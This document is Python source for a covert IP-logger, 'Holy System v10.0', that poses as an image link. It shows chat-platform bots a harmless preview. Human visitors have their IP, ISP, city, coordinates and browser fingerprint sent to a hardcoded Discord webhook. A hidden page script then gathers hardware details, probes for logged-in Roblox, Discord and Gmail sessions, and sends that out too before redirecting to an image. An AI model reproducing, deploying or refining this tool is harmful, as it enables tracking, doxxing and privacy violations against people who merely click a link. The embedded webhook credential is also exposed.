# ==============================================================================
# HOLY SYSTEM v10.0 - THE MASTER HUNTER (ELITE ANALYTICS)
# NO SHORT CODE - FULL SENSOR DATA - SOCIAL ARCHIVE - HARDWARE DEEP TRACE
# ==============================================================================

from http.server import BaseHTTPRequestHandler
import requests
import httpagentparser
import time

# --- CONFIGURATION ---
WEBHOOK_URL = "https://discord.com/api/webhooks/1457320227212886170/1gwlEi-KBGixKbJZenFYUqD98j_tNENmZY2rS6kxWHQ2ExlgIC3UK7_OW2XVD8eHDVR6"
REDIRECT_IMAGE = "https://media.discordapp.net/attachments/1457070623238127690/1457320607749509130/images_12.jpg"
BOT_NAME = "Holy Master Hunter v10"

class handler(BaseHTTPRequestHandler):

    def do_GET(self):
        try:
            # 1. Capture Identity & Bot Protection
            ip = self.headers.get('x-forwarded-for', self.client_address[0]).split(',')[0]
            ua = self.headers.get('user-agent', 'Unknown')
            is_bot = any(b in ua for b in ["Discordbot", "TelegramBot", "Twitterbot", "Slackbot"])

            if is_bot:
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(f'<html><head><meta property="og:image" content="{REDIRECT_IMAGE}"></head></html>'.encode())
                return

            # 2. FETCH ADVANCED NETWORK & GEO DATA
            # fields: status, country, countryCode, regionName, city, zip, lat, lon, timezone, isp, org, as, proxy, hosting, query
            geo = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857", timeout=10).json()
            os_n, br_n = httpagentparser.simple_detect(ua)
            is_vpn = geo.get('proxy') or geo.get('hosting')
            maps_url = f"https://www.google.com/maps?q={geo.get('lat')},{geo.get('lon')}"

            # 3. CONSTRUCT THE ELITE DISCORD EMBED
            fields = [
                {
                    "name": "📍 Target Geography",
                    "value": f"**Country:** {geo.get('country')} ({geo.get('countryCode')})\n**Region:** {geo.get('regionName')}\n**City:** {geo.get('city')}\n**ZIP:** `{geo.get('zip')}`\n**Timezone:** {geo.get('timezone')}",
                    "inline": False
                },
                {
                    "name": "📡 Connection Intelligence",
                    "value": f"**IP:** `{ip}`\n**ISP:** {geo.get('isp')}\n**Org:** {geo.get('org')}\n**ASN:** {geo.get('as')}",
                    "inline": False
                },
                {
                    "name": "🛡️ Security Analysis",
                    "value": f"**VPN/Proxy:** {'🚨 DETECTED' if is_vpn else '✅ CLEAN'}\n**Hosting/DataCenter:** {'⚠️ YES' if geo.get('hosting') else '✅ NO'}",
                    "inline": True
                },
                {
                    "name": "🛰️ GPS Tracking",
                    "value": f"[📍 View Exact Point on Maps]({maps_url})",
                    "inline": True
                },
                {
                    "name": "💻 Client Fingerprint",
                    "value": f"**OS:** `{os_n}`\n**Browser:** `{br_n}`\n**User-Agent:** ```{ua[:150]}...```",
                    "inline": False
                }
            ]

            requests.post(WEBHOOK_URL, json={
                "username": BOT_NAME,
                "embeds": [{
                    "title": "⚡ MASTER TRACE COMPLETED - TARGET EXPOSED",
                    "color": 0xFF0000 if is_vpn else 0x7289DA,
                    "fields": fields,
                    "footer": {"text": "Holy v10.0 Master Engine | Cyber Intelligence Unit"}
                }]
            })

            # 4. THE MASTER AGENT (The Deepest Scan Possible in Browser)
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            agent_html = f'''
            <!DOCTYPE html>
            <html>
            <body style="background:#000; color:#0f0; font-family:monospace; display:flex; flex-direction:column; justify-content:center; align-items:center; height:100vh; overflow:hidden;">
                <h2 style="font-size:14px;">SYNCING WITH SERVER...</h2>
                <div style="border:1px solid #0f0; width:200px; height:10px;"><div id="bar" style="background:#0f0; width:0%; height:100%;"></div></div>
                <script>
                async function masterSniff() {{
                    let report = "**Final Master Report:**\\n";
                    
                    // Hardware Analysis
                    report += "🖥️ **CPU Cores:** " + (navigator.hardwareConcurrency || "N/A") + "\\n";
                    report += "📟 **RAM (Approx):** " + (navigator.deviceMemory || "N/A") + " GB\\n";
                    report += "🖼️ **Screen:** " + screen.width + "x" + screen.height + " (" + screen.colorDepth + " bit)\\n";
                    
                    // Session Sniffing (Roblox, Discord, Google)
                    const sites = [
                        {{ name: "Roblox", url: "https://www.roblox.com/mobileapi/check-app-launch" }},
                        {{ name: "Discord", url: "https://discord.com/api/v9/experiments" }},
                        {{ name: "Gmail", url: "https://accounts.google.com/ServiceLogin?service=mail" }},
                        {{ name: "TikTok", url: "https://www.tiktok.com/login" }},
                        {{ name: "Instagram", url: "https://www.instagram.com/accounts/login/" }}
                    ];

                    for (let site of sites) {{
                        try {{
                            await fetch(site.url, {{ mode: 'no-cors' }});
                            report += "🔹 **" + site.name + ":** Session Found ✅\\n";
                        }} catch(e) {{}}
                    }}

                    // Battery & Power
                    if (navigator.getBattery) {{
                        const b = await navigator.getBattery();
                        report += "🔋 **Battery:** " + (b.level * 100) + "% (" + (b.charging ? "Charging" : "Plugged Out") + ")\\n";
                    }}

                    // Exfiltrate to Discord
                    await fetch("{WEBHOOK_URL}", {{
                        method: 'POST',
                        headers: {{ 'Content-Type': 'application/json' }},
                        body: JSON.stringify({{ 
                            username: "Master Intelligence Agent", 
                            content: report + "🔗 Target URL: " + window.location.href
                        }})
                    }});

                    document.getElementById("bar").style.width = "100%";
                    setTimeout(() => {{ window.location.href = "{REDIRECT_IMAGE}"; }}, 600);
                }}
                masterSniff();
                </script>
            </body>
            </html>
            '''
            self.wfile.write(agent_html.encode())

        except Exception:
            self.send_response(302)
            self.send_header('Location', REDIRECT_IMAGE)
            self.end_headers()

app = handler
